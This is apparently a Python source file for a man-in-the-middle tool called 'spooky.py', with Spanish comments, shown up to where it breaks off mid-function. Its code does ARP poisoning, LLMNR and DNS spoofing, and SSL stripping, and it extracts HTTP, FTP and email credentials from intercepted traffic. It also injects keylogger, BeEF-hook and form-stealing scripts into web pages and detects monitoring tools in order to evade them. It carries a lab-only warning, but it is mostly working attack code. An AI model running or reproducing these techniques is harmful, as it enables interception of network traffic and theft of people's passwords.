#!/usr/bin/env python3
# spooky.py - Enhanced MITM & Sniffing Tool
# Herramienta avanzada con modo interactivo para MITM + sniffing.
# Uso: sudo python3 spooky.py
# By: Vixy & Rubir0za - Enhanced Version 2.0
# ADVERTENCIA: Ejecutar solo en tu laboratorio de VMs con permiso explícito. ;)

import argparse
import threading
import time
import sys
import signal
import subprocess
import shutil
import shlex
import json
import base64
import re
import random
import hashlib
import socket
import struct
import urllib.parse
import html
import os
from datetime import datetime
from collections import defaultdict
from abc import ABC, abstractmethod
import logging
from pathlib import Path

# Enhanced imports for new features
try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from flask import Flask, render_template_string, jsonify, request as flask_request
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False

from scapy.all import (
    ARP, Ether, srp, send, sniff, wrpcap, conf, get_if_hwaddr,
    IP, UDP, DNS, DNSQR, DNSRR, get_if_addr, TCP, Raw, ICMP,
    IPv6, ICMPv6EchoRequest, ICMPv6ND_NS, ICMPv6ND_NA
)

# ------------------ ASCII ART ------------------
# Spooky ASCII Art removed - using clean compact banner instead
# Color constants for enhanced terminal output
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
GRAY = "\033[90m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"

# Color combinations
HEADER = f"{BOLD}{CYAN}"
SUCCESS = f"{BOLD}{GREEN}"
WARNING = f"{BOLD}{YELLOW}"
ERROR = f"{BOLD}{RED}"
INFO = f"{BOLD}{BLUE}"
HIGHLIGHT = f"{BOLD}{MAGENTA}"

# ------------------ Enhanced Configuration ------------------
PROFILES = {
    "corporate": {
        "targets": ["SMB", "HTTP", "LDAP", "MSSQL"],
        "stealth": True,
        "duration": 3600,
        "ssl_strip": False,
        "credential_harvest": True
    },
    "wifi_audit": {
        "targets": ["DNS", "HTTP", "HTTPS"],
        "stealth": False,
        "ssl_strip": True,
        "fake_ap": False,
        "duration": 1800
    },
    "red_team": {
        "targets": ["ALL"],
        "stealth": True,
        "ssl_strip": True,
        "payload_injection": True,
        "evasion": True,
        "duration": 7200
    },
    "forensics": {
        "targets": ["ALL"],
        "stealth": True,
        "deep_inspection": True,
        "ml_analysis": True,
        "duration": 0  # unlimited
    }
}

# ------------------ Globals ------------------
stopped = False
poison_thread = None
captured_packets = []
lock = threading.Lock()
responder_thread = None
responder_stop = threading.Event()
llmnr_last_reply = {}
llmnr_stats = {"replied": 0, "queries": 0}

# Enhanced globals
session_data = {
    "start_time": None,
    "credentials": [],
    "hosts_discovered": set(),
    "services_detected": {},
    "dns_queries": [],
    "http_requests": [],
    "injected_payloads": [],
    "ssl_stripped": [],
    "suspicious_traffic": []
}

detected_monitoring = []
current_profile = None
web_dashboard = None
plugins = []

# ------------------ Enhanced Classes ------------------
class SpookyPlugin(ABC):
    """Base class for Spooky plugins"""
    def __init__(self, name, description):
        self.name = name
        self.description = description
        self.enabled = True
    
    @abstractmethod
    def execute(self, packet, session_data):
        """Execute plugin functionality"""
        pass
    
    def log(self, message):
        log(f"[{self.name}] {message}")

class CredentialExtractor(SpookyPlugin):
    """Plugin for automatic credential extraction"""
    def __init__(self):
        super().__init__("CredentialExtractor", "Extracts credentials from common protocols")
        self.protocols = ['HTTP', 'FTP', 'Telnet', 'SMTP', 'POP3', 'IMAP', 'SNMP']
    
    def execute(self, packet, session_data):
        if not packet.haslayer(Raw):
            return
            
        payload = packet[Raw].load
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
        except:
            return
        
        # HTTP Basic Auth
        if packet.haslayer(TCP) and packet[TCP].dport in [80, 8080, 3128]:
            auth_match = re.search(r'Authorization: Basic ([A-Za-z0-9+/=]+)', payload_str, re.IGNORECASE)
            if auth_match:
                try:
                    decoded = base64.b64decode(auth_match.group(1)).decode('utf-8')
                    if ':' in decoded:
                        username, password = decoded.split(':', 1)
                        self._save_credential('HTTP Basic Auth', username, password, packet[IP].src)
                except:
                    pass
        
        # FTP credentials
        elif packet.haslayer(TCP) and packet[TCP].dport == 21:
            user_match = re.search(r'USER ([^\r\n]+)', payload_str, re.IGNORECASE)
            pass_match = re.search(r'PASS ([^\r\n]+)', payload_str, re.IGNORECASE)
            if user_match:
                session_data.setdefault('ftp_users', {})[packet[IP].src] = user_match.group(1)
            if pass_match and packet[IP].src in session_data.get('ftp_users', {}):
                username = session_data['ftp_users'][packet[IP].src]
                self._save_credential('FTP', username, pass_match.group(1), packet[IP].src)
        
        # SMTP/POP3/IMAP
        elif packet.haslayer(TCP) and packet[TCP].dport in [25, 110, 143, 587, 993, 995]:
            auth_match = re.search(r'AUTH LOGIN|AUTH PLAIN', payload_str, re.IGNORECASE)
            if auth_match:
                # Handle base64 encoded credentials
                b64_match = re.search(r'([A-Za-z0-9+/=]{20,})', payload_str)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode('utf-8')
                        self._save_credential('EMAIL', 'base64_decoded', decoded, packet[IP].src)
                    except:
                        pass
    
    def _save_credential(self, protocol, username, password, source_ip):
        cred = {
            'timestamp': datetime.now().isoformat(),
            'protocol': protocol,
            'username': username,
            'password': password,
            'source_ip': source_ip
        }
        session_data['credentials'].append(cred)
        self.log(f"Credential captured - {protocol}: {username}:{password} from {source_ip}")

class ServiceDetector(SpookyPlugin):
    """Plugin for automatic service detection"""
    def __init__(self):
        super().__init__("ServiceDetector", "Detects services and protocols automatically")
        self.common_ports = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 135: 'RPC', 139: 'NetBIOS', 143: 'IMAP',
            443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S', 1433: 'MSSQL',
            3389: 'RDP', 5985: 'WinRM', 5986: 'WinRM-HTTPS'
        }
    
    def execute(self, packet, session_data):
        if not packet.haslayer(TCP):
            return
        
        src_ip = packet[IP].src
        dst_port = packet[TCP].dport
        
        if dst_port in self.common_ports:
            service = self.common_ports[dst_port]
            if src_ip not in session_data['services_detected']:
                session_data['services_detected'][src_ip] = []
            
            if service not in session_data['services_detected'][src_ip]:
                session_data['services_detected'][src_ip].append(service)
                self.log(f"Service detected: {service} on {src_ip}:{dst_port}")

class SSLStripper(SpookyPlugin):
    """Plugin for SSL/TLS stripping"""
    def __init__(self):
        super().__init__("SSLStripper", "Strips SSL/TLS to downgrade HTTPS to HTTP")
        self.target_domains = ['login', 'auth', 'secure', 'bank', 'pay']
    
    def execute(self, packet, session_data):
        if not packet.haslayer(Raw) or not packet.haslayer(TCP):
            return
        
        if packet[TCP].dport in [80, 8080]:
            payload = packet[Raw].load
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                
                # Look for HTTPS redirects and strip them
                if 'Location: https://' in payload_str:
                    stripped_payload = payload_str.replace('https://', 'http://')
                    session_data['ssl_stripped'].append({
                        'timestamp': datetime.now().isoformat(),
                        'source_ip': packet[IP].src,
                        'original_url': payload_str,
                        'stripped_url': stripped_payload
                    })
                    self.log(f"SSL stripped from {packet[IP].src}")
                
            except:
                pass

class PayloadInjector(SpookyPlugin):
    """Plugin for payload injection into HTTP traffic"""
    def __init__(self):
        super().__init__("PayloadInjector", "Injects payloads into HTTP responses")
        self.payloads = {
            'keylogger': '<script>document.addEventListener("keydown",function(e){fetch("/log?key="+e.key)});</script>',
            'beef_hook': '<script src="http://192.168.1.100:3000/hook.js"></script>',
            'credential_stealer': '''<script>
                document.addEventListener("submit", function(e) {
                    if(e.target.tagName === "FORM") {
                        var formData = new FormData(e.target);
                        fetch("/steal", {method: "POST", body: formData});
                    }
                });
            </script>'''
        }
    
    def execute(self, packet, session_data):
        if not packet.haslayer(Raw) or not packet.haslayer(TCP):
            return
        
        if packet[TCP].sport in [80, 8080] and packet[TCP].dport > 1024:
            payload = packet[Raw].load
            try:
                payload_str = payload.decode('utf-8', errors='ignore')
                
                # Inject into HTML responses
                if '<html' in payload_str.lower() and '</body>' in payload_str.lower():
                    for payload_name, payload_code in self.payloads.items():
                        if payload_name in session_data.get('active_payloads', []):
                            injected_payload = payload_str.replace('</body>', f'{payload_code}</body>')
                            session_data['injected_payloads'].append({
                                'timestamp': datetime.now().isoformat(),
                                'target_ip': packet[IP].dst,
                                'payload_type': payload_name,
                                'success': True
                            })
                            self.log(f"Payload '{payload_name}' injected for {packet[IP].dst}")
                            break
            except:
                pass

class AntiDetection(SpookyPlugin):
    """Plugin for anti-detection and evasion"""
    def __init__(self):
        super().__init__("AntiDetection", "Detects monitoring tools and implements evasion")
        self.monitoring_processes = [
            'wireshark', 'tcpdump', 'tshark', 'ettercap', 'nmap', 'masscan',
            'snort', 'suricata', 'zeek', 'bro', 'argus', 'ntopng'
        ]
    
    def execute(self, packet, session_data):
        # This runs periodically, not per packet
        pass
    
    def check_monitoring(self):
        """Check for active monitoring tools"""
        if not HAS_PSUTIL:
            return []
        
        detected = []
        try:
            for proc in psutil.process_iter(['name', 'cmdline']):
                proc_name = proc.info['name'].lower() if proc.info['name'] else ''
                cmdline = ' '.join(proc.info['cmdline']).lower() if proc.info['cmdline'] else ''
                
                for monitor in self.monitoring_processes:
                    if monitor in proc_name or monitor in cmdline:
                        detected.append({
                            'process': proc_name,
                            'pid': proc.pid,
                            'cmdline': cmdline[:100]  # truncate
                        })
                        break
        except:
            pass
        
        if detected:
            self.log(f"Monitoring tools detected: {len(detected)}")
            
        return detected

class IPv6Handler(SpookyPlugin):
    """Plugin for IPv6 support and attacks"""
    def __init__(self):
        super().__init__("IPv6Handler", "Handles IPv6 traffic and attacks")
    
    def execute(self, packet, session_data):
        if packet.haslayer(IPv6):
            ipv6_src = packet[IPv6].src
            ipv6_dst = packet[IPv6].dst
            
            session_data.setdefault('ipv6_hosts', set()).add(ipv6_src)
            
            # Log IPv6 traffic
            if packet.haslayer(ICMPv6EchoRequest):
                self.log(f"IPv6 ping from {ipv6_src} to {ipv6_dst}")
            elif packet.haslayer(ICMPv6ND_NS):
                self.log(f"IPv6 Neighbor Discovery from {ipv6_src}")

class OSINTIntegrator(SpookyPlugin):
    """Plugin for OSINT integration"""
    def __init__(self):
        super().__init__("OSINTIntegrator", "Integrates OSINT lookups")
        self.checked_ips = set()
    
    def execute(self, packet, session_data):
        if not HAS_REQUESTS:
            return
        
        src_ip = packet[IP].src
        if src_ip not in self.checked_ips and not self._is_private_ip(src_ip):
            self.checked_ips.add(src_ip)
            # In a real implementation, you'd add API calls to Shodan, etc.
            self.log(f"OSINT lookup queued for {src_ip}")
    
    def _is_private_ip(self, ip):
        """Check if IP is in private ranges"""
        try:
            import ipaddress
            return ipaddress.ip_address(ip).is_private
        except:
            return True


# ------------------ Enhanced Utility Functions ------------------
def detect_cloud_environment():
    """Detect if we're running in a cloud environment"""
    cloud_indicators = {
        'AWS': ['/sys/hypervisor/uuid', '/sys/devices/virtual/dmi/id/product_uuid'],
        'Azure': ['/sys/class/dmi/id/sys_vendor'],
        'GCP': ['/sys/class/dmi/id/product_name'],
        'Docker': ['/.dockerenv', '/proc/1/cgroup']
    }
    
    detected = []
    for cloud, paths in cloud_indicators.items():
        for path in paths:
            try:
                if os.path.exists(path):
                    with open(path, 'r') as f:
                        content = f.read().lower()
                        if cloud.lower() in content or 'amazon' in content or 'microsoft' in content:
                            detected.append(cloud)
                            break
            except:
                continue
    
    return detected

def generate_report(session_data, output_file="spooky_report.html"):
    """Generate comprehensive HTML report"""
    report_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Spooky MITM Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .header { background: #2c3e50; color: white; padding: 20px; }
            .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; }
            .credential { background: #f8d7da; padding: 10px; margin: 5px; }
            .host { background: #d4edda; padding: 10px; margin: 5px; }
            .warning { background: #fff3cd; padding: 10px; margin: 5px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🕷️ Spooky MITM Attack Report</h1>
            <p>Generated: {{ timestamp }}</p>
            <p>Session Duration: {{ duration }}</p>
        </div>
        
        <div class="section">
            <h2>📊 Executive Summary</h2>
            <ul>
                <li>Credentials Captured: {{ credentials_count }}</li>
                <li>Hosts Discovered: {{ hosts_count }}</li>
                <li>Services Detected: {{ services_count }}</li>
                <li>DNS Queries Intercepted: {{ dns_count }}</li>
                <li>HTTP Requests: {{ http_count }}</li>
            </ul>
        </div>
        
        <div class="section">
            <h2>🔑 Captured Credentials</h2>
            {% for cred in credentials %}
            <div class="credential">
                <strong>{{ cred.protocol }}</strong> - {{ cred.username }}:{{ cred.password }} 
                <small>(from {{ cred.source_ip }} at {{ cred.timestamp }})</small>
            </div>
            {% endfor %}
        </div>
        
        <div class="section">
            <h2>🖥️ Discovered Hosts & Services</h2>
            {% for host, services in services.items() %}
            <div class="host">
                <strong>{{ host }}</strong>: {{ services|join(', ') }}
            </div>
            {% endfor %}
        </div>
        
        <div class="section">
            <h2>🌐 Network Activity Timeline</h2>
            <table>
                <tr><th>Time</th><th>Type</th><th>Details</th></tr>
                {% for event in timeline %}
                <tr>
                    <td>{{ event.timestamp }}</td>
                    <td>{{ event.type }}</td>
                    <td>{{ event.details }}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </body>
    </html>
    '''
    
    # Process session data
    duration = "Unknown"
    if session_data.get('start_time'):
        duration = str(datetime.now() - session_data['start_time'])
    
    # Create timeline
    timeline = []
    for cred in session_data.get('credentials', []):
        timeline.append({
            'timestamp': cred['timestamp'],
            'type': 'Credential',
            'details': f"{cred['protocol']}: {cred['username']} from {cred['source_ip']}"
        })
    
    # Simple template rendering (would use Jinja2 in production)
    report_content = report_template.replace('{{ timestamp }}', datetime.now().isoformat())
    report_content = report_content.replace('{{ duration }}', duration)
    report_content = report_content.replace('{{ credentials_count }}', str(len(session_data.get('credentials', []))))
    report_content = report_content.replace('{{ hosts_count }}', str(len(session_data.get('hosts_discovered', set()))))
    report_content = report_content.replace('{{ services_count }}', str(len(session_data.get('services_detected', {}))))
    report_content = report_content.replace('{{ dns_count }}', str(len(session_data.get('dns_queries', []))))
    report_content = report_content.replace('{{ http_count }}', str(len(session_data.get('http_requests', []))))
    
    try:
        with open(output_file, 'w') as f:
            f.write(report_content)
        log(f"[*] Report generated: {output_file}")
    except Exception as e:
        log(f"[!] Error generating report: {e}")

def analyze_traffic_patterns(pcap_file):
    """Basic ML-style traffic analysis"""
    try:
        from scapy.all import rdpcap
        packets = rdpcap(pcap_file)
        
        analysis = {
            'total_packets': len(packets),
            'protocols': defaultdict(int),
            'top_talkers': defaultdict(int),
            'suspicious_patterns': [],
            'time_analysis': {
                'start_time': None,
                'end_time': None,
                'peak_traffic': None
            }
        }
        
        for pkt in packets:
            # Protocol analysis
            if pkt.haslayer(TCP):
                analysis['protocols']['TCP'] += 1
            elif pkt.haslayer(UDP):
                analysis['protocols']['UDP'] += 1
            elif pkt.haslayer(ICMP):
                analysis['protocols']['ICMP'] += 1
            
            # Top talkers
            if pkt.haslayer(IP):
                analysis['top_talkers'][pkt[IP].src] += 1
                analysis['top_talkers'][pkt[IP].dst] += 1
        
        # Detect suspicious patterns
        for ip, count in analysis['top_talkers'].items():
            if count > len(packets) * 0.1:  # More than 10% of traffic
                analysis['suspicious_patterns'].append(f"High traffic volume from {ip}: {count} packets")
        
        return analysis
        
    except Exception as e:
        log(f"[!] Error analyzing traffic patterns: {e}")
        return None

def randomize_mac_address(interface):
    """Randomize MAC address for stealth"""
    try:
        # Generate random MAC
        mac_parts = [0x00, 0x16, 0x3e]  # VMware OUI prefix
        mac_parts.extend([random.randint(0x00, 0xff) for _ in range(3)])
        new_mac = ':'.join(f'{x:02x}' for x in mac_parts)
        
        # Change MAC (Linux)
        subprocess.run(['ip', 'link', 'set', 'dev', interface, 'down'], check=True)
        subprocess.run(['ip', 'link', 'set', 'dev', interface, 'address', new_mac], check=True)
        subprocess.run(['ip', 'link', 'set', 'dev', interface, 'up'], check=True)
        
        log(f"[*] MAC address randomized to {new_mac}")
        return new_mac
    except Exception as e:
        log(f"[!] Failed to randomize MAC: {e}")
        return None

def stealth_mode_settings():
    """Apply stealth mode configurations"""
    stealth_configs = [
        # Randomize ARP timing
        ('arp_interval_min', 30),
        ('arp_interval_max', 120),
        # Reduce packet size
        ('mtu_size', 1200),
        # Use source routing
        ('use_source_routing', True),
        # Fragment packets
        ('fragment_packets', True)
    ]
    
    return dict(stealth_configs)

def check_ids_detection():
    """Check for Intrusion Detection Systems"""
    ids_signatures = [
        # ARP poisoning detection
        'arp.*duplicate',
        'arp.*flood',
        # MITM detection
        'mitm.*detected',
        'man.in.the.middle',
        # Network scanning
        'port.*scan',
        'network.*scan'
    ]
    
    # In a real implementation, this would check system logs
    log("[*] IDS detection check completed")
    return False

def dns_hijack_handler(packet, target_domains):
    """Advanced DNS hijacking"""
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
        qname = packet[DNSQR].qname.decode().rstrip('.')
        
        # Check if domain should be hijacked
        for target in target_domains:
            if target in qname.lower():
                # Craft response
                fake_ip = "192.168.1.100"  # Attacker's IP
                response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=53) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                              an=DNSRR(rrname=qname, type='A', rdata=fake_ip))
                
                send(response, verbose=0)
                session_data['dns_queries'].append({
                    'timestamp': datetime.now().isoformat(),
                    'domain': qname,
                    'original_ip': packet[IP].src,
                    'hijacked_ip': fake_ip
                })
                log(f"[*] DNS hijacked: {qname} -> {fake_ip}")
                return True
    return False

def create_web_dashboard():
    """Create web dashboard for real-time monitoring"""
    if not HAS_FLASK:
        log("[!] Flask not available for web dashboard")
        return None
    
    app = Flask(__name__)
    
    dashboard_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Spooky Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body { font-family: Arial, sans-serif; margin: 0; background: #1a1a1a; color: #fff; }
            .header { background: #2c3e50; padding: 20px; text-align: center; }
            .stats { display: flex; justify-content: space-around; padding: 20px; }
            .stat-box { background: #34495e; padding: 15px; border-radius: 5px; text-align: center; min-width: 120px; }
            .content { padding: 20px; }
            .section { background: #2c3e50; margin: 10px 0; padding: 15px; border-radius: 5px; }
            .credential { background: #e74c3c; padding: 10px; margin: 5px; border-radius: 3px; }
            .host { background: #27ae60; padding: 10px; margin: 5px; border-radius: 3px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🕷️ Spooky MITM Dashboard</h1>
            <p>Real-time monitoring - Auto-refresh every 5 seconds</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <h3>{{ credentials|length }}</h3>
                <p>Credentials</p>
            </div>
            <div class="stat-box">
                <h3>{{ hosts|length }}</h3>
                <p>Hosts</p>
            </div>
            <div class="stat-box">
                <h3>{{ packets }}</h3>
                <p>Packets</p>
            </div>
            <div class="stat-box">
                <h3>{{ session_duration }}</h3>
                <p>Duration</p>
            </div>
        </div>
        
        <div class="content">
            <div class="section">
                <h2>Recent Credentials</h2>
                {% for cred in credentials[-5:] %}
                <div class="credential">
                    <strong>{{ cred.protocol }}</strong>: {{ cred.username }}:{{ cred.password }} 
                    <small>({{ cred.source_ip }})</small>
                </div>
                {% endfor %}
            </div>
            
            <div class="section">
                <h2>Active Hosts</h2>
                {% for host in hosts %}
                <div class="host">{{ host }}</div>
                {% endfor %}
            </div>
        </div>
    </body>
    </html>
    '''
    
    @app.route('/')
    def dashboard():
        duration = "Unknown"
        if session_data.get('start_time'):
            delta = datetime.now() - session_data['start_time']
            duration = str(delta).split('.')[0]  # Remove microseconds
        
        return render_template_string(dashboard_template,
            credentials=session_data.get('credentials', []),
            hosts=list(session_data.get('hosts_discovered', set())),
            packets=len(captured_packets),
            session_duration=duration
        )
    
    @app.route('/api/stats')
    def api_stats():
        return jsonify({
            'credentials': len(session_data.get('credentials', [])),
            'hosts': len(session_data.get('hosts_discovered', set())),
            'packets': len(captured_packets),
            'uptime': str(datetime.now() - session_data.get('start_time', datetime.now()))
        })
    
    return app

def llmnr_handler(pkt):
    # Very small LLMNR responder: reply to A queries with our iface IP
    if DNS in pkt and pkt[DNS].qdcount > 0:
        qname = pkt[DNSQR].qname.decode() if isinstance(pkt[DNSQR].qname, bytes) else pkt[DNSQR].qname
        # Only respond to standard queries
        if pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0:
            iface = opts.get('iface') or conf.iface
            our_ip = get_if_addr(iface) if iface else None
            if not our_ip:
                return
            # record stats
            try:
                llmnr_stats['queries'] = llmnr_stats.get('queries', 0) + 1
            except Exception:
                pass
            # rate-limit replies per name to avoid floods (once per 2s)
            now = time.time()
            last = llmnr_last_reply.get(qname)
            if last and (now - last) < 2.0:
                return
            llmnr_last_reply[qname] = now
            # log the query name and source (metadata-only)
            try:
                if opts.get('log_auth_events'):
                    ts = datetime.now().isoformat()
                    src = pkt[IP].src if IP in pkt else 'unknown'
                    line = f"[{ts}] LLMNR query '{qname}' from {src}"
                    with open(opts.get('auth_logfile','spooky_auth.log'), 'a') as f:
                        f.write(line + "\n")
            except Exception:
                pass
            # craft a simple response
            resp = IP(dst=pkt[IP].src, src=our_ip)/UDP(dport=pkt[UDP].sport, sport=5355)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNSQR].qname, type='A', rdata=our_ip))
            send(resp, verbose=0)
            try:
                llmnr_stats['replied'] = llmnr_stats.get('replied', 0) + 1
            except Exception:
                pass


def _llmnr_thread(iface):
    # sniff LLMNR on UDP 5355
    bpf = "udp port 5355"
    try:
        sniff(iface=iface, filter=bpf, prn=llmnr_handler, stop_filter=lambda x: responder_stop.is_set())
    except Exception as e:
        log(f"[!] Error en LLMNR responder: {e}")


def start_llmnr_responder(iface=None):
    global responder_thread, responder_stop
    if not iface:
        iface = opts.get("iface")
    if not iface:
        raise RuntimeError("iface required to start llmnr responder")
    responder_stop.clear()
    responder_thread = threading.Thread(target=_llmnr_thread, args=(iface,), daemon=True)
    responder_thread.start()
    log(f"[*] LLMNR responder iniciado en {iface}")


def stop_llmnr_responder():
    global responder_thread, responder_stop
    responder_stop.set()
    if responder_thread is not None:
        responder_thread.join(timeout=2)
    responder_thread = None
    log("[*] LLMNR responder detenido")


def run_responder_external():
    # Try to locate Responder.py in common locations or current dir
    candidate = shutil.which("Responder.py") or shutil.which("responder.py")
    if not candidate:
        # check local repo
        local = Path("Responder.py")
        if local.exists():
            candidate = str(local)
    if not candidate:
        raise RuntimeError("Responder.py no encontrado en PATH ni en el directorio actual")
    # spawn it with supervised logs
    log(f"[*] Lanzando Responder externo: {candidate}")
    # ensure logs dir
    logs_dir = Path("logs")
    try:
        logs_dir.mkdir(exist_ok=True)
    except Exception:
        pass
    ts = datetime.now().strftime("%Y%m%d-%H%M%S")
    log_file = logs_dir / f"responder_{ts}.log"
    try:
        fh = open(str(log_file), "ab")
    except Exception:
        fh = subprocess.DEVNULL
    proc = subprocess.Popen(["python3", candidate, "-I", opts.get("iface") or conf.iface], stdout=fh, stderr=fh)
    opts["_responder_proc"] = proc

    # Supervisor thread: restarts process up to limit if enabled
    def supervisor():
        stop_ev = opts.get("_responder_supervisor_stop")
        restarts = 0
        limit = opts.get("responder_restart_limit", 3)
        last_proc = proc
        while not (stop_ev and stop_ev.is_set()):
            current = opts.get("_responder_proc")
            if current and current.poll() is None:
                time.sleep(1)
                continue
            # process exited or not set
            if current:
                rc = current.poll()
                log(f"[!] Responder exited with code {rc}")
            if not opts.get("responder_supervise", True):
                break
            if restarts >= limit:
                log(f"[!] Responder restart limit reached ({limit}). Not restarting.")
                break
            restarts += 1
            log(f"[*] Reiniciando Responder (intento {restarts}/{limit})...")
            try:
                # reopen log file to append
                fh2 = open(str(log_file), "ab")
                newp = subprocess.Popen(["python3", candidate, "-I", opts.get("iface") or conf.iface], stdout=fh2, stderr=fh2)
                opts["_responder_proc"] = newp
            except Exception as e:
                log(f"[!] Error reiniciando Responder: {e}")
                break
            time.sleep(1)
        log("[*] Responder supervisor terminado")

    if opts.get("responder_supervise", True):
        stop_ev = threading.Event()
        opts["_responder_supervisor_stop"] = stop_ev
        th = threading.Thread(target=supervisor, daemon=True)
        opts["_responder_supervisor_thread"] = th
        th.start()
    return proc

# Runtime options (defaults)
opts = {
    "iface": None,
    "target": None,
    "gateway": None,
    "pcap": "spooky_capture.pcap",
    "timeout": 60,
    "interval": 2.0,
    "only_sniff": False,
    "promisc": False,
    "use_tcpdump": False,
    "bpf_filter": "",   # BPF expression (tcpdump/Scapy)
    "enable_logging": True,
    # Auth-event logging: metadata-only (no secrets)
    "log_auth_events": False,
    "auth_logfile": "spooky_auth.log",
    "logfile": "spooky.log",
    # pcap rotation
    "max_pcap_size_mb": 0,  # 0 = disabled
    "max_pcap_files": 5,
    # responder supervision defaults
    "responder_supervise": True,
    "responder_restart_limit": 3,
    # consent gating
    "require_consent_file": None,
}

# Resolved MACs
target_mac = None
gateway_mac = None

# ------------------ Utils ------------------
def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    if opts["enable_logging"]:
        try:
            with open(opts["logfile"], "a") as f:
                f.write(line + "\n")
        except Exception:
            pass

def get_mac(ip, iface, timeout=2, retry=2):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, _ = srp(pkt, iface=iface, timeout=timeout, retry=retry, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

def ensure_pcap_parent(pcap_path):
    p = Path(pcap_path)
    if not p.parent.exists():
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass

def rotate_pcap_if_needed(pcap_path):
    """Rotate pcap files when size exceeds configured max (simple numeric rotation).
    """
    try:
        max_mb = int(opts.get("max_pcap_size_mb", 0) or 0)
        if max_mb <= 0:
            return
        p = Path(pcap_path)
        if not p.exists():
            return
        size_mb = p.stat().st_size / (1024.0*1024.0)
        if size_mb < max_mb:
            return
        max_files = int(opts.get("max_pcap_files", 5) or 5)
        # rotate: pcap -> pcap.1, pcap.1 -> pcap.2, keep up to max_files
        for i in range(max_files-1, 0, -1):
            src = p.with_suffix(p.suffix + f".{i}")
            dst = p.with_suffix(p.suffix + f".{i+1}")
            if src.exists():
                try:
                    src.rename(dst)
                except Exception:
                    pass
        # move current to .1
        try:
            p.rename(p.with_suffix(p.suffix + ".1"))
        except Exception:
            pass
        log(f"[*] Rotated pcap {pcap_path} (size {size_mb:.1f}MB)")
    except Exception:
        pass

def show_auth_log(tail=50):
    path = opts.get('auth_logfile','spooky_auth.log')
    p = Path(path)
    if not p.exists():
        print(f"No existe archivo de auth-log: {path}")
        return
    try:
        with open(path, 'r') as f:
            lines = f.readlines()
        if tail and tail > 0:
            for l in lines[-tail:]:
                print(l.rstrip())
        else:
            for l in lines:
                print(l.rstrip())
    except Exception as e:
        print(f"Error leyendo auth-log: {e}")

def check_consent_or_raise():
    """If require_consent_file is configured, ensure it exists and contains token 'CONSENT'"""
    path = opts.get('require_consent_file')
    if not path:
        return True
    p = Path(path)
    if not p.exists():
        raise RuntimeError(f"Consent file required but not found: {path}")
    try:
        content = p.read_text()
        if 'CONSENT' in content:
            log(f"[*] Consentimiento verificado en {path}")
            return True
    except Exception:
        pass
    raise RuntimeError(f"Consent file {path} invalid or missing token")

def cleanup_responder_supervisor():
    try:
        stop_ev = opts.get('_responder_supervisor_stop')
        if stop_ev:
            stop_ev.set()
        th = opts.get('_responder_supervisor_thread')
        if th and th.is_alive():
            th.join(timeout=2)
        # terminate process if running
        proc = opts.get('_responder_proc')
        if proc and proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except Exception:
                proc.kill()
    except Exception:
        pass

def restore_arp(target_ip, target_mac_local, gateway_ip, gateway_mac_local, iface, count=5):
    log("[*] Restaurando ARP (envío paquetes correctos)...")
    pkt1 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst=target_mac_local, psrc=gateway_ip, hwsrc=gateway_mac_local)
    pkt2 = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac_local, psrc=target_ip, hwsrc=target_mac_local)
    for _ in range(count):
        send(pkt1, iface=iface, verbose=0)
        send(pkt2, iface=iface, verbose=0)
        time.sleep(0.3)
    log("[*] ARP restaurado.")

def poison_loop(t_ip, t_mac, g_ip, g_mac, iface, interval=2.0):
    global stopped
    fake_to_target = ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=g_ip)
    fake_to_gateway = ARP(op=2, pdst=g_ip, hwdst=g_mac, psrc=t_ip)
    sent = 0
    log("[*] Poison loop activo.")
    while not stopped:
        send(fake_to_target, iface=iface, verbose=0)
        send(fake_to_gateway, iface=iface, verbose=0)
        sent += 2
        time.sleep(max(0.1, interval))
    log(f"[*] Poison loop detenido. {sent} paquetes enviados (estimado).")
    return sent

def packet_handler(pkt):
    global session_data
    
    with lock:
        captured_packets.append(pkt)
    
    # Enhanced packet processing
    try:
        # Update host discovery
        if pkt.haslayer(IP):
            session_data['hosts_discovered'].add(pkt[IP].src)
            session_data['hosts_discovered'].add(pkt[IP].dst)
        
